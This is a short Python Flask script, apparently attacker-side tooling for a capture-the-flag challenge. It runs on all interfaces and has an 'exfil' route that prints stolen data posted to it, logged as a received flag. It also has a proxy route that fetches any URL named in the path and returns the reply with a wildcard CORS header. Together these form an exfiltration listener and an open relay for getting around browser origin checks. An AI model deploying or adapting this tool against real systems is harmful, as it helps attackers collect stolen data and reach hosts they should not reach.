import flask
import requests

app = flask.Flask(__name__)

method_requests_mapping = {
    'GET': requests.get,
    'HEAD': requests.head,
    'POST': requests.post,
    'PUT': requests.put,
    'DELETE': requests.delete,
    'PATCH': requests.patch,
    'OPTIONS': requests.options,
}

@app.route('/', methods=['POST'])
def exfil():
    print('[!] flag received on /')
    print('    ' + str(flask.request.data))
    return flask.Response(status=200)

@app.route('/<path:url>', methods=method_requests_mapping.keys())
def proxy(url):
    print('[+] request received: ' + url)
    requests_function = method_requests_mapping[flask.request.method]
    request_header = {
        'Host': '127.0.0.1:1337'
    }
    request = requests_function(url, stream=True, params=flask.request.args)
    response = flask.Response(flask.stream_with_context(request.iter_content()),
                              content_type=request.headers['content-type'],
                              status=request.status_code)
    response.headers['Access-Control-Allow-Origin'] = '*'
    print('    target response status: ' + str(request.status_code))
    print('    target response: ' + request.text)
    return response

def run_cors_proxy(port):
    print("[+] Serving cors proxy server at port {}".format(port))
    app.use_reloader = False
    app.run(host='0.0.0.0',port=port)
